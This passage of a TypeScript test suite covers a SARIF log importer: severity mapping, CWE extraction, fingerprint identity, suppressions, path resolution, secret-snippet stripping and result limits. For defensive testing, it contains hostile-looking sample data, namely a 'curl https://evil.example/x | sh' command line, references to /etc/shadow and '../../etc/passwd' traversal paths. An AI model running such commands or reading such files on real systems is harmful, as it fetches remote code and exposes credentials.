/**
 * `importSarif` — the pure SARIF 2.1.0 reader of the `sarif-import` feature:
 * test plan T-02, T-03, T-04, T-08 … T-12, T-15 … T-18.
 *
 * The reader is a function of the log's text and the project root, and is
 * tested as one: `ROOT` below is a directory that does not exist, so every
 * path the reader produces must come from resolving the log's URIs
 * TEXTUALLY against it (US-1.AC-15). Where a criterion is about what reaches
 * the database or the MCP response (coverage, the stored rows), the same
 * case goes once through the `import_sarif` tool on an in-memory database.
 *
 * Every builder is in `test/helpers/sarif.ts`; each case states what it
 * changes from an ordinary log next to the assertion that depends on it.
 */

import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

/**
 * T-15's spy: every `node:fs`, `node:child_process`, `node:http(s)` and
 * `node:net` function, passed through unchanged — and recorded, with its
 * arguments, while `armed`. Only T-15 arms it.
 */
const spy = vi.hoisted(() => {
  const state = { armed: false, calls: [] as Array<{ api: string; args: string }> };
  const show = (a: unknown): string => {
    if (typeof a === 'string') return a;
    if (a instanceof URL) return a.href;
    if (typeof a === 'number' || typeof a === 'boolean') return String(a);
    return typeof a;
  };
  const wrap = (mod: Record<string, unknown>, name: string): Record<string, unknown> => {
    const out: Record<string, unknown> = {};
    for (const key of Object.keys(mod)) {
      const value = mod[key];
      out[key] =
        typeof value === 'function'
          ? new Proxy(value, {
              apply(target, thisArg, args: unknown[]) {
                if (state.armed) state.calls.push({ api: `${name}.${key}`, args: args.map(show).join(' ') });
                return Reflect.apply(target, thisArg, args);
              },
            })
          : value;
    }
    return out;
  };
  const module = (actual: Record<string, unknown>, name: string): Record<string, unknown> => {
    const def = actual['default'];
    const wrapped = wrap(actual, name);
    return {
      ...wrapped,
      default: def !== null && typeof def === 'object' ? wrap(def as Record<string, unknown>, name) : def,
    };
  };
  return { state, module };
});

vi.mock('node:fs', async (importOriginal) => spy.module(await importOriginal<Record<string, unknown>>(), 'fs'));
vi.mock('node:fs/promises', async (importOriginal) =>
  spy.module(await importOriginal<Record<string, unknown>>(), 'fs/promises'),
);
vi.mock('node:child_process', async (importOriginal) =>
  spy.module(await importOriginal<Record<string, unknown>>(), 'child_process'),
);
vi.mock('node:http', async (importOriginal) => spy.module(await importOriginal<Record<string, unknown>>(), 'http'));
vi.mock('node:https', async (importOriginal) => spy.module(await importOriginal<Record<string, unknown>>(), 'https'));
vi.mock('node:net', async (importOriginal) => spy.module(await importOriginal<Record<string, unknown>>(), 'net'));

import { openSetForProject } from '../../../src/history/openSet.js';
import {
  importSarif,
  type SarifImportContext,
  type SarifImportResult,
  type SarifImportRun,
} from '../../../src/sarif/importSarif.js';
import type { Finding, Severity } from '../../../src/types.js';
import { POSIX } from '../../helpers/fsCapabilities.js';
import { freshPlugin, projectDir } from '../../helpers/historySeed.js';
import {
  callTool,
  importOk,
  messageOf,
  metaCounts,
  requireTool,
  sarifLog,
  sarifResult,
  sarifRule,
  sarifRun,
  sarifText,
  scanRow,
  scansOf,
  writeSarif,
  type Json,
  type JsonObject,
  type ResultSpec,
} from '../../helpers/sarif.js';
import { strictInputSchema } from '../../../src/tools/index.js';
import { cleanupTempDirs } from '../../helpers/tempDir.js';
import { mulberry32 } from '../../helpers/yamlFuzz.js';

afterAll(cleanupTempDirs);
beforeAll(async () => {
  await import('../../../src/registerAll.js');
});

/** A project root that does not exist: the reader must resolve paths against it textually. */
const ROOT = resolve('/sarif-unit', 'project');
const inRoot = (...parts: string[]): string => join(ROOT, ...parts);
/** `file:` URL of a directory, with the trailing slash SARIF base URIs carry. */
const dirUrl = (dir: string): string => `${pathToFileURL(dir).href}/`;

/** A fake credential, assembled so no literal provider token sits in this file (AWS's documentation example). */
const AWS_KEY = ['AKIA', 'IOSFODNN7', 'EXAMPLE'].join('');

function read(log: Json, ctx: Partial<SarifImportContext> = {}): SarifImportResult {
  return importSarif(sarifText(log), { projectPath: ROOT, ...ctx });
}

/** The one run of `log`. */
function runOf(log: Json, ctx: Partial<SarifImportContext> = {}): SarifImportRun {
  const result = read(log, ctx);
  expect(result.runs).toHaveLength(1);
  const run = result.runs[0];
  if (run === undefined) throw new Error('no run');
  return run;
}

/** The one finding of `run`. */
function single(run: SarifImportRun): Finding {
  expect(run.findings).toHaveLength(1);
  const f = run.findings[0];
  if (f === undefined) throw new Error('no finding');
  return f;
}

/** The finding of `run` whose message is `text`. */
function withMessage(run: SarifImportRun, text: string): Finding {
  const f = run.findings.find((x) => messageOf(x).includes(text));
  expect(f, `a finding with message '${text}'`).toBeDefined();
  if (f === undefined) throw new Error(`no finding '${text}'`);
  return f;
}

/** A one-run log of `results` (and `rules`) from `tool`. */
function logOf(results: JsonObject[], run: Parameters<typeof sarifRun>[0] = {}): JsonObject {
  return sarifLog([sarifRun({ tool: 'ExternalTool', ...run, results })]);
}

/** An ordinary failing result in the project. */
function plain(extra: ResultSpec = {}): JsonObject {
  return sarifResult({ ruleId: 'r1', message: 'plain finding', uri: 'src/a.js', startLine: 1, ...extra });
}

// ---------------------------------------------------------------------------
describe('T-02 location, rule, message and severity (US-1.AC-2)', () => {
  it('T-02 a physical location in the project is stored as a relative path with its lines, rule id and message', () => {
    const run = runOf(
      logOf([
        sarifResult({
          ruleId: 'js/sql-injection',
          message: 'Query built from user input.',
          uri: 'src/db/query.js',
          startLine: 12,
          endLine: 14,
        }),
      ]),
    );
    const f = single(run);
    expect(f).toMatchObject({ file_path: 'src/db/query.js', line_start: 12, line_end: 14, rule_id: 'js/sql-injection' });
    expect(messageOf(f)).toContain('Query built from user input.');
    expect(run.counts).toMatchObject({
      results: 1,
      imported: 1,
      without_location: 0,
      suppressed_at_source: 0,
      not_findings: 0,
      duplicates: 0,
      truncated: 0,
    });
    expect(run.counts.skipped).toEqual([]);
  });

  // The design's table: >= 9 critical, >= 7 high, >= 4 medium, > 0 low, 0 info.
  // On the RULE, where GitHub code scanning reads it (CodeQL, Trivy); the
  // result's own level says something else on purpose.
  const BY_SECURITY_SEVERITY: Array<[string | number, Severity]> = [
    ['9.8', 'critical'],
    ['9.0', 'critical'],
    ['8.9', 'high'],
    ['7.0', 'high'],
    [7.5, 'high'],
    ['6.9', 'medium'],
    ['4.0', 'medium'],
    ['3.9', 'low'],
    ['0.1', 'low'],
    ['0', 'info'],
  ];
  it.each(BY_SECURITY_SEVERITY)('T-02 rule security-severity %s → %s, whatever the level', (score, expected) => {
    const run = runOf(
      logOf([plain({ level: 'note' })], { rules: [sarifRule('r1', { properties: { 'security-severity': score } })] }),
    );
    expect(single(run).severity).toBe(expected);
  });

  it('T-02 security-severity on the result itself counts too', () => {
    const run = runOf(logOf([plain({ level: 'note', properties: { 'security-severity': '9.1' } })]));
    expect(single(run).severity).toBe('critical');
  });

  const BY_LEVEL: Array<[string, string | undefined, Severity]> = [
    ['error', undefined, 'high'],
    ['warning', undefined, 'medium'],
    ['note', undefined, 'info'],
    ['none', 'fail', 'info'],
  ];
  it.each(BY_LEVEL)('T-02 without security-severity, level %s (kind %s) → %s', (level, kind, expected) => {
    const run = runOf(logOf([plain({ level, ...(kind !== undefined ? { kind } : {}) })]));
    expect(single(run).severity).toBe(expected);
  });

  // A dev-guardian export carries the exact severity in properties.severity:
  // `low` and `info` are both level `note`, `critical` and `high` both `error`.
  const FROM_EXPORT: Array<[string, Severity]> = [
    ['note', 'low'],
    ['note', 'info'],
    ['error', 'critical'],
    ['error', 'high'],
  ];
  it.each(FROM_EXPORT)("T-02 a dev-guardian export's properties.severity wins over its level %s → %s", (level, severity) => {
    const run = runOf(logOf([plain({ level, properties: { severity, category: 'security' } })], { tool: 'dev-guardian' }));
    expect(single(run).severity).toBe(severity);
  });
});

// ---------------------------------------------------------------------------
describe('T-03 CWE identifiers (US-1.AC-3)', () => {
  const CASES: Array<[string, { rule?: JsonObject; result?: ResultSpec }, string[]]> = [
    ['rule tags external/cwe/cwe-089 (CodeQL zero-padding)', { rule: { properties: { tags: ['security', 'external/cwe/cwe-089'] } } }, ['CWE-89']],
    [
      'two rule tags',
      { rule: { properties: { tags: ['external/cwe/cwe-79', 'external/cwe/cwe-116'] } } },
      ['CWE-116', 'CWE-79'],
    ],
    ['result properties.tags', { result: { properties: { tags: ['external/cwe/cwe-22'] } } }, ['CWE-22']],
    ['result taxa with a bare id', { result: { taxa: [{ id: '78', toolComponent: { name: 'CWE' } }] } }, ['CWE-78']],
    ['result taxa with a CWE- id', { result: { taxa: [{ id: 'CWE-611', toolComponent: { name: 'CWE' } }] } }, ['CWE-611']],
    ['result properties.cwe as a string', { result: { properties: { cwe: 'CWE-918' } } }, ['CWE-918']],
    ['rule properties.cwe as a list', { rule: { properties: { cwe: ['CWE-352', 'CWE-1021'] } } }, ['CWE-1021', 'CWE-352']],
  ];
  it.each(CASES)('T-03 %s', (_name, where, expected) => {
    const run = runOf(
      logOf([plain(where.result ?? {})], { rules: [sarifRule('r1', where.rule ?? {})] }),
    );
    const f = single(run);
    expect([...(f.cwe ?? [])].sort()).toEqual([...expected].sort());
  });

  it('T-03 tags that name no CWE leave it unknown, never empty', () => {
    const run = runOf(
      logOf([plain()], { rules: [sarifRule('r1', { properties: { tags: ['security', 'maintainability', 'external/owasp/owasp-a03'] } })] }),
    );
    expect(single(run).cwe).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
describe('T-04 identity from the log fingerprints (US-1.AC-4, SC-002) — property', () => {
  const FP_NAMES = ['primaryLocationLineHash', 'primaryLocationStartColumnFingerprint', 'matchBasedId/v1', 'custom/v2'];

  function shuffle<T>(r: () => number, xs: readonly T[]): T[] {
    const out = [...xs];
    for (let i = out.length - 1; i > 0; i -= 1) {
      const j = Math.floor(r() * (i + 1));
      const a = out[i];
      const b = out[j];
      if (a === undefined || b === undefined) continue;
      out[i] = b;
      out[j] = a;
    }
    return out;
  }
  const hex = (r: () => number, n: number): string =>
    Array.from({ length: n }, () => Math.floor(r() * 16).toString(16)).join('');
  const pick = <T>(r: () => number, xs: readonly T[]): T => {
    const x = xs[Math.floor(r() * xs.length)];
    if (x === undefined) throw new Error('empty pool');
    return x;
  };

  /** message → identity, asserting every finding has one. */
  function identities(run: SarifImportRun): Map<string, string> {
    const out = new Map<string, string>();
    for (const f of run.findings) {
      const message = messageOf(f).find((m) => m.startsWith('m-')) ?? '';
      expect(f.identity, `identity of ${message}`).toMatch(/^[0-9a-f]{64}$/);
      out.set(message, f.identity ?? '');
    }
    return out;
  }

  it('T-04 over 250 generated pairs of logs with the same fingerprints — keys and results reordered, lines moved — each finding keeps its identity, and different fingerprints never share one', () => {
    const r = mulberry32(20261002);
    for (let c = 0; c < 250; c += 1) {
      const n = 1 + Math.floor(r() * 8);
      const specs = Array.from({ length: n }, (_, i) => {
        const names = shuffle(r, FP_NAMES).slice(0, 1 + Math.floor(r() * 3));
        return {
          message: `m-${String(c)}-${String(i)}`,
          // Few rules and files, so results collide on everything but their fingerprints.
          ruleId: pick(r, ['js/a', 'js/b']),
          uri: pick(r, ['src/a.js', 'src/b.js']),
          line: 1 + Math.floor(r() * 200),
          partial: r() < 0.7,
          fps: Object.fromEntries(names.map((name) => [name, hex(r, 16)])),
        };
      });
      const result = (s: (typeof specs)[number], line: number, reverseKeys: boolean): JsonObject => {
        const entries = Object.entries(s.fps);
        const fps = Object.fromEntries(reverseKeys ? [...entries].reverse() : entries);
        return sarifResult({
          ruleId: s.ruleId,
          message: s.message,
          uri: s.uri,
          startLine: line,
          ...(s.partial ? { partialFingerprints: fps } : { fingerprints: fps }),
        });
      };
      const first = runOf(logOf(specs.map((s) => result(s, s.line, false)), { tool: 'CodeQL' }));
      const second = runOf(
        logOf(
          shuffle(r, specs).map((s) => result(s, 1 + Math.floor(r() * 200), true)),
          { tool: 'CodeQL' },
        ),
      );
      const a = identities(first);
      const b = identities(second);
      expect(a.size, `case ${String(c)}: every result is a finding`).toBe(n);
      expect([...b.entries()].sort(), `case ${String(c)}`).toEqual([...a.entries()].sort());
      expect(new Set(a.values()).size, `case ${String(c)}: distinct fingerprints, distinct identities`).toBe(n);
    }
  });
});

// ---------------------------------------------------------------------------
describe('T-08 suppressed at the source (US-1.AC-8)', () => {
  const log = (): JsonObject =>
    logOf([
      plain({ message: 'open one', startLine: 1 }),
      plain({ message: 'accepted at source', startLine: 2, suppressions: [{ kind: 'inSource', status: 'accepted' }] }),
      plain({ message: 'rejected suppression', startLine: 3, suppressions: [{ kind: 'external', status: 'rejected' }] }),
    ]);

  it('T-08 an accepted suppression is counted in suppressed_at_source and is never an open finding', () => {
    const run = runOf(log());
    expect(run.counts.suppressed_at_source).toBe(1);
    const messages = run.findings.flatMap(messageOf);
    expect(messages).not.toContain('accepted at source');
    expect(messages).toContain('open one');
    // Only `accepted` suppresses: a rejected suppression leaves the finding open.
    expect(messages).toContain('rejected suppression');
  });

  it("T-08 through import_sarif: the project's open set never holds it", async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t08-');
    const out = await importOk(s.plugin, project, writeSarif(project, 'a.sarif', log()));
    expect(out.counts_total['suppressed_at_source']).toBe(1);
    const open = openSetForProject(s.storage, project).findings.flatMap(messageOf);
    expect(open).not.toContain('accepted at source');
    expect(open).toContain('open one');
  });
});

// ---------------------------------------------------------------------------
describe('T-09 results that are not findings (US-1.AC-9)', () => {
  const NOT_FINDINGS: Array<[string, ResultSpec]> = [
    ['kind pass', { kind: 'pass' }],
    ['kind notApplicable', { kind: 'notApplicable' }],
    ['kind informational', { kind: 'informational' }],
    ['kind open', { kind: 'open' }],
    ['kind review', { kind: 'review' }],
    ['level none with no kind', { level: 'none' }],
  ];
  it.each(NOT_FINDINGS)('T-09 %s is counted in not_findings, never imported', (_name, spec) => {
    const run = runOf(logOf([plain({ message: 'a real finding', startLine: 1 }), plain({ message: 'not a finding', startLine: 2, ...spec })]));
    expect(run.counts.not_findings).toBe(1);
    expect(run.findings.flatMap(messageOf)).not.toContain('not a finding');
    expect(run.findings.flatMap(messageOf)).toContain('a real finding');
  });

  it('T-09 kind fail with level none, and no kind with a level, are findings', () => {
    const run = runOf(
      logOf([plain({ message: 'fail/none', kind: 'fail', level: 'none', startLine: 1 }), plain({ message: 'warning', level: 'warning', startLine: 2 })]),
    );
    expect(run.counts.not_findings).toBe(0);
    expect(run.findings).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
describe('T-10 a log that is not SARIF 2.1.0 is refused (US-1.AC-10, EC-5)', () => {
  const valid = (): JsonObject => logOf([plain()]);
  const without = (key: string): JsonObject => {
    const log = valid();
    delete log[key];
    return log;
  };
  const INVALID: Array<[string, string, RegExp]> = [
    ['not JSON', '{"version": "2.1.0", "runs": [', /json/i],
    ['an empty file', '', /empty/i],
    ['version 2.0.0', sarifText({ ...valid(), version: '2.0.0' }), /version/i],
    ['version as a number', sarifText({ ...valid(), version: 2.1 }), /version/i],
    ['no version', sarifText(without('version')), /version/i],
    ['no runs', sarifText(without('runs')), /runs/i],
    ['runs that is not an array', sarifText({ ...valid(), runs: { tool: 'x' } }), /runs/i],
    ['a top-level array', '[]', /version|runs|object/i],
  ];

  it.each(INVALID)('T-10 %s → invalid_sarif naming the problem', (_name, text, names) => {
    let error: unknown;
    try {
      importSarif(text, { projectPath: ROOT });
    } catch (e) {
      error = e;
    }
    expect(error, 'refused').toMatchObject({ code: 'invalid_sarif' });
    expect(error instanceof Error ? error.message : '').toMatch(names);
  });

  it('T-10 a UTF-8 BOM before a valid log is accepted (EC-5)', () => {
    const result = importSarif(`﻿${sarifText(valid())}`, { projectPath: ROOT });
    expect(result.runs).toHaveLength(1);
    expect(result.runs[0]?.findings).toHaveLength(1);
  });

  it('T-10 through import_sarif: every invalid log is refused as invalid_sarif and no scan is registered', async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t10-');
    for (const [name, text] of INVALID) {
      const path = writeSarif(project, `bad/${name.replace(/\W+/g, '-')}.sarif`, text);
      const r = await callTool('import_sarif', { project_path: project, sarif_path: path }, s.plugin);
      expect(r.ok, name).toBe(false);
      if (r.ok) continue;
      expect(r.code, name).toBe('invalid_sarif');
    }
    expect(scansOf(s.plugin, project)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
describe('T-11 locations (US-1.AC-11, EC-1, EC-2, EC-3)', () => {
  interface LocCase {
    uri: string;
    uriBaseId?: string;
    bases?: JsonObject;
  }
  const located = (c: LocCase): SarifImportRun =>
    runOf(
      logOf([plain({ uri: c.uri, startLine: 7, ...(c.uriBaseId !== undefined ? { uriBaseId: c.uriBaseId } : {}) })], {
        ...(c.bases !== undefined ? { originalUriBaseIds: c.bases } : {}),
      }),
    );

  const IN_PROJECT: Array<[string, LocCase, string]> = [
    ['a relative POSIX uri', { uri: 'src/a.js' }, 'src/a.js'],
    ['a relative uri with Windows separators (EC-2)', { uri: 'src\\win\\a.js' }, 'src/win/a.js'],
    ['a percent-encoded relative uri (EC-2)', { uri: 'src/my%20file.js' }, 'src/my file.js'],
    ['a file:// uri inside the project (EC-2)', { uri: pathToFileURL(inRoot('src', 'a.js')).href }, 'src/a.js'],
    ['a file:// uri with an encoded space (EC-2)', { uri: pathToFileURL(inRoot('src', 'my file.js')).href }, 'src/my file.js'],
    ['an absolute native path inside the project — a drive letter on Windows (EC-2)', { uri: inRoot('src', 'a.js') }, 'src/a.js'],
    ['a uriBaseId resolved to the project root (EC-1)', { uri: 'src/a.js', uriBaseId: 'SRCROOT', bases: { SRCROOT: { uri: dirUrl(ROOT) } } }, 'src/a.js'],
    ['a uriBaseId resolved to a directory inside the project (EC-1)', { uri: 'a.js', uriBaseId: 'SRC', bases: { SRC: { uri: dirUrl(inRoot('src')) } } }, 'src/a.js'],
    [
      'a uriBaseId outside the project (a CI checkout): the uri is relative to the root (EC-1)',
      { uri: 'src/a.js', uriBaseId: 'ROOTPATH', bases: { ROOTPATH: { uri: 'file:///ci/workspace/' } } },
      'src/a.js',
    ],
    ['a uriBaseId the log does not define: the uri is relative to the root (EC-1)', { uri: 'src/a.js', uriBaseId: '%SRCROOT%' }, 'src/a.js'],
  ];
  it.each(IN_PROJECT)('T-11 %s', (_name, c, expected) => {
    const run = located(c);
    expect(single(run)).toMatchObject({ file_path: expected, line_start: 7 });
    expect(run.counts.without_location).toBe(0);
  });

  it.skipIf(POSIX)('T-11 a file:// uri with a lower-case drive letter (EC-2, Windows only)', () => {
    const lower = `file:///${ROOT.charAt(0).toLowerCase()}${ROOT.slice(1).replace(/\\/g, '/')}/src/a.js`;
    expect(single(located({ uri: lower }))).toMatchObject({ file_path: 'src/a.js', line_start: 7 });
  });

  const elsewhere = resolve(ROOT, '..', 'elsewhere', 'x.js');
  const WITHOUT: Array<[string, ResultSpec, JsonObject | undefined]> = [
    ['a logical location only', { locations: [{ logicalLocations: [{ fullyQualifiedName: 'pkg.Mod.fn' }] }] }, undefined],
    ['no location at all', { locations: [] }, undefined],
    ['a relative uri escaping the root', { uri: '../../outside/x.js', startLine: 7 }, undefined],
    ['a percent-encoded traversal escaping the root (EC-2)', { uri: 'src/%2E%2E/%2E%2E/%2E%2E/x.js', startLine: 7 }, undefined],
    ['a file:// uri outside the project', { uri: pathToFileURL(elsewhere).href, startLine: 7 }, undefined],
    ['an absolute path outside the project', { uri: elsewhere, startLine: 7 }, undefined],
    ['a remote uri', { uri: 'https://example.com/src/a.js', startLine: 7 }, undefined],
    [
      'a uriBaseId inside the root whose uri escapes it',
      { uri: '../../etc/passwd', uriBaseId: 'SRCROOT', startLine: 7 },
      { SRCROOT: { uri: dirUrl(ROOT) } },
    ],
  ];
  it.each(WITHOUT)('T-11 %s → imported with no file and no line, counted in without_location', (_name, spec, bases) => {
    const run = runOf(logOf([plain({ message: 'located nowhere', ...spec })], bases !== undefined ? { originalUriBaseIds: bases } : {}));
    const f = withMessage(run, 'located nowhere');
    expect(f.file_path).toBeUndefined();
    expect(f.line_start).toBeUndefined();
    expect(run.counts.without_location).toBe(1);
  });

  it('T-11 with several locations the first is the primary one (EC-3)', () => {
    const run = runOf(
      logOf([
        plain({
          locations: [
            { physicalLocation: { artifactLocation: { uri: 'src/first.js' }, region: { startLine: 3 } } },
            { physicalLocation: { artifactLocation: { uri: 'src/second.js' }, region: { startLine: 9 } } },
          ],
        }),
      ]),
    );
    expect(single(run)).toMatchObject({ file_path: 'src/first.js', line_start: 3 });
  });
});

// ---------------------------------------------------------------------------
describe('T-12 results that cannot be imported (US-1.AC-12, EC-4, EC-6)', () => {
  it('T-12 no ruleId, no ruleIndex and no message → skipped with its index and a reason', () => {
    const run = runOf(logOf([plain(), sarifResult({ message: null, uri: 'src/b.js', startLine: 2 })]));
    expect(run.findings).toHaveLength(1);
    expect(run.counts.skipped).toHaveLength(1);
    expect(run.counts.skipped[0]?.index).toBe(1);
    expect(run.counts.skipped[0]?.reason).toMatch(/\S/);
  });

  it('T-12 a ruleIndex out of range is skipped (EC-4)', () => {
    const run = runOf(
      logOf([plain({ ruleId: undefined, ruleIndex: 0 }), sarifResult({ ruleIndex: 5, message: 'dangling rule', uri: 'src/b.js', startLine: 2 })], {
        rules: [sarifRule('only-rule')],
      }),
    );
    expect(run.counts.skipped.map((s) => s.index)).toEqual([1]);
    expect(run.findings.flatMap(messageOf)).not.toContain('dangling rule');
  });

  it('T-12 a ruleIndex with no ruleId is resolved against tool.driver.rules (EC-4)', () => {
    const run = runOf(logOf([sarifResult({ ruleIndex: 1, message: 'by index', uri: 'src/a.js', startLine: 1 })], { rules: [sarifRule('zero'), sarifRule('one')] }));
    expect(single(run).rule_id).toBe('one');
    expect(run.counts.skipped).toEqual([]);
  });

  it('T-12 a rule reference into tool.extensions is resolved against that extension (EC-4)', () => {
    const run = runOf(
      logOf([sarifResult({ rule: { index: 1, toolComponent: { index: 0 } }, message: 'from a pack', uri: 'src/a.js', startLine: 1 })], {
        tool: 'CodeQL',
        rules: [],
        extensions: [{ name: 'codeql/javascript-queries', rules: [sarifRule('js/xss'), sarifRule('js/sql-injection')] }],
      }),
    );
    expect(single(run).rule_id).toBe('js/sql-injection');
  });

  it('T-12 a result with a message but no rule is imported, not skipped', () => {
    const run = runOf(logOf([sarifResult({ message: 'no rule at all', uri: 'src/a.js', startLine: 1 })]));
    expect(run.counts.skipped).toEqual([]);
    expect(run.findings.flatMap(messageOf)).toContain('no rule at all');
  });

  it('T-12 the same result twice in a run is one finding, counted in duplicates (EC-6)', () => {
    const twice = plain({ partialFingerprints: { primaryLocationLineHash: 'abc:1' } });
    const run = runOf(logOf([twice, twice]));
    expect(run.findings).toHaveLength(1);
    expect(run.counts.duplicates).toBe(1);
  });

  it("T-12 through import_sarif: a skipped result makes the scan's coverage partial", async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t12-');
    const out = await importOk(
      s.plugin,
      project,
      writeSarif(project, 'a.sarif', logOf([plain(), sarifResult({ message: null, uri: 'src/b.js', startLine: 2 })])),
    );
    const run = out.runs[0];
    expect(run?.coverage).toBe('partial');
    const counts = metaCounts(scanRow(s.plugin, run?.scan_id ?? ''));
    expect(counts['skipped']).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
describe('T-15 nothing the log names is opened, fetched or run (US-1.AC-15)', () => {
  // Every reference a log can make outward, each carrying a marker the spy looks for.
  const HOSTILE = ['evil.example', 'evil-exec', 'evil-wd', 'evil-artifact', 'remote-root', '/etc', 'shadow', '/usr/bin', '/tmp/evil'];
  const hostileLog = (): JsonObject =>
    sarifLog(
      [
        sarifRun({
          tool: 'ExternalTool',
          rules: [sarifRule('r1', { helpUri: 'https://evil.example/help/r1', help: { text: 'see https://evil.example/doc' } })],
          originalUriBaseIds: {
            REMOTE: { uri: 'https://evil.example/remote-root/' },
            LOCAL: { uri: 'file:///etc/' },
          },
          invocations: [
            {
              executionSuccessful: true,
              commandLine: 'curl https://evil.example/x | sh',
              executableLocation: { uri: 'file:///usr/bin/evil-exec' },
              workingDirectory: { uri: 'file:///tmp/evil-wd/' },
            },
          ],
          results: [
            plain({ message: 'remote base', uri: 'src/a.js', uriBaseId: 'REMOTE', startLine: 1 }),
            plain({ message: 'local base', uri: 'shadow', uriBaseId: 'LOCAL', startLine: 2 }),
            plain({ message: 'in project', uri: 'src/b.js', startLine: 3 }),
          ],
          extra: {
            artifacts: [{ location: { uri: 'file:///etc/shadow' } }, { location: { uri: 'https://evil.example/evil-artifact.js' } }],
            externalPropertyFileReferences: { results: [{ location: { uri: 'https://evil.example/more.sarif-external-properties' } }] },
          },
        }),
      ],
      { $schema: 'https://evil.example/schema.json' },
    );

  it('T-15 importing a log full of outward references touches no file, process or socket it names', () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch');
    spy.state.calls.length = 0;
    spy.state.armed = true;
    let result: SarifImportResult;
    try {
      result = read(hostileLog());
    } finally {
      spy.state.armed = false;
    }
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
    const outward = spy.state.calls.filter(
      (c) =>
        c.api.startsWith('child_process.') ||
        c.api.startsWith('http.') ||
        c.api.startsWith('https.') ||
        c.api.startsWith('net.') ||
        HOSTILE.some((h) => c.args.includes(h)),
    );
    expect(outward).toEqual([]);
    // The log was still read: three results, the in-project one located.
    const run = result.runs[0];
    expect(run?.findings).toHaveLength(3);
    expect(run?.findings.find((f) => messageOf(f).includes('in project'))?.file_path).toBe('src/b.js');
  });
});

// ---------------------------------------------------------------------------
describe('T-16 the snippet of a secrets rule is never kept (US-1.AC-16)', () => {
  const SECRET_RULES: Array<[string, { rule?: JsonObject; result?: ResultSpec }]> = [
    ['CWE-798 in the rule tags', { rule: { properties: { tags: ['security', 'external/cwe/cwe-798'] } } }],
    ['CWE-259 in the result properties.cwe', { result: { properties: { cwe: 'CWE-259' } } }],
    ['CWE-321 in the result taxa', { result: { taxa: [{ id: '321', toolComponent: { name: 'CWE' } }] } }],
    ['the tag secret', { rule: { properties: { tags: ['secret'] } } }],
  ];
  const secretLog = (where: { rule?: JsonObject; result?: ResultSpec }): JsonObject =>
    logOf(
      [
        plain({
          uri: 'config/aws.ini',
          startLine: 4,
          snippet: `aws_access_key_id = ${AWS_KEY}`,
          contextSnippet: `[default]\naws_access_key_id = ${AWS_KEY}`,
          ...(where.result ?? {}),
        }),
      ],
      { rules: [sarifRule('r1', where.rule ?? {})] },
    );

  it.each(SECRET_RULES)('T-16 %s: rule, file and line are kept, the snippet is not', (_name, where) => {
    const run = runOf(secretLog(where));
    const f = single(run);
    expect(f).toMatchObject({ rule_id: 'r1', file_path: 'config/aws.ini', line_start: 4 });
    expect(JSON.stringify(run)).not.toContain(AWS_KEY);
  });

  it('T-16 through import_sarif: neither the stored rows nor the response hold it', async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t16-');
    const out = await importOk(s.plugin, project, writeSarif(project, 'secrets.sarif', secretLog(SECRET_RULES[0]?.[1] ?? {})));
    expect(JSON.stringify(out)).not.toContain(AWS_KEY);
    const rows = out.runs.flatMap((run) => s.storage.findings.listByScan(run.scan_id));
    expect(rows).toHaveLength(1);
    expect(JSON.stringify(rows)).not.toContain(AWS_KEY);
  });
});

// ---------------------------------------------------------------------------
describe('T-17 limits: results per import and message size (US-1.AC-17)', () => {
  const many = (n: number): JsonObject[] =>
    Array.from({ length: n }, (_, i) => plain({ message: `result ${String(i)}`, startLine: i + 1 }));

  it('T-17 stops at maxResults and counts what was left out', () => {
    const run = runOf(logOf(many(8)), { maxResults: 5 });
    expect(run.findings).toHaveLength(5);
    expect(run.counts.truncated).toBe(3);
  });

  it('T-17 the default limit is 50 000 results', () => {
    const results = Array.from(
      { length: 50_001 },
      (_, i) => `{"ruleId":"r1","message":{"text":"m${String(i)}"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":"src/a.js"},"region":{"startLine":${String(i + 1)}}}}]}`,
    );
    const text = `{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"Bulk"}},"results":[${results.join(',')}]}]}`;
    const result = importSarif(text, { projectPath: ROOT });
    expect(result.runs[0]?.findings).toHaveLength(50_000);
    expect(result.runs[0]?.counts.truncated).toBe(1);
  }, 120_000);

  /** Whether `s` holds half of a surrogate pair — a string cut through a character. */
  const brokenSurrogate = (s: string): boolean => /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(s);

  it.each([
    ['ASCII', `START-${'x'.repeat(10_000)}`],
    ['four-byte characters', `START-${'\u{1F600}'.repeat(2_000)}`],
  ])('T-17 a message over 4 KiB (%s) is cut to at most 4096 bytes, at a character boundary', (_name, message) => {
    const f = single(runOf(logOf([plain({ message })])));
    const texts = messageOf(f);
    expect(texts.some((t) => t.startsWith('START-'))).toBe(true);
    for (const t of texts) {
      expect(Buffer.byteLength(t, 'utf8')).toBeLessThanOrEqual(4096);
      expect(brokenSurrogate(t)).toBe(false);
    }
  });

  it("T-17 through import_sarif: max_results makes the scan's coverage partial and says how many were left out", async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t17-');
    const out = await importOk(s.plugin, project, writeSarif(project, 'many.sarif', logOf(many(8))), { max_results: 5 });
    const run = out.runs[0];
    expect(run?.coverage).toBe('partial');
    expect(metaCounts(scanRow(s.plugin, run?.scan_id ?? ''))['truncated']).toBe(3);
    expect(s.storage.findings.listByScan(run?.scan_id ?? '')).toHaveLength(5);
  });

  it('T-17 import_sarif takes max_results up to 200 000 and no more', async () => {
    const schema = strictInputSchema(requireTool('import_sarif'));
    expect((await schema.safeParseAsync({ sarif_path: 'a.sarif', max_results: 200_000 })).success).toBe(true);
    expect((await schema.safeParseAsync({ sarif_path: 'a.sarif', max_results: 200_001 })).success).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('T-18 no log content in errors or diagnostics (US-1.AC-18) — property', () => {
  interface Case {
    text: string;
